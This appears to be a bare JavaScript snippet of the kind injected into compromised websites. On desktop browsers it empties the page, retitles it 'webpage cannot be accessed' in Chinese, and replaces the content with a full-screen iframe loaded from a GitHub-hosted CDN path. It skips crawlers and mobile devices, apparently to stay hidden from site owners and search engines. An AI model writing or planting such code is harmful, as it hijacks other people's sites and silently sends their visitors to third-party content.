var curpath=function() {
	var a = document.scripts;
	var b = a[a.length - 1];
	var c = b.src;
	return c.substring(0, c.lastIndexOf("/") + 1);
}();
//window.addEventListener('DOMContentLoaded', function() {
    var system = {};
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.ispc = navigator.userAgent.match(/spider|iPad|iPhone|iPod|Android/i) == null;
    if (system.win || system.mac || system.ispc) {
     var iframe_url = curpath+'//cdn.jsdelivr.net/gh/xiaoerlan1010/jjss@main/404.html';
    $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>网页无法访问</title><style>body{position:static !important;}body *{ visibility:hidden; }</style> ');
    $("body").empty();
    $(document).ready(function() {
        $("body").html('<iframe style="width:100%; height:460px;position:absolute;margin-left:0px;margin-top:0px;top:20%;left:0%;" id="mainFrame" src="' + iframe_url + '" frameborder="0" scrolling="no"></iframe>').show();
        $("body *").css("visibility", "visible")
    })
    }
//});



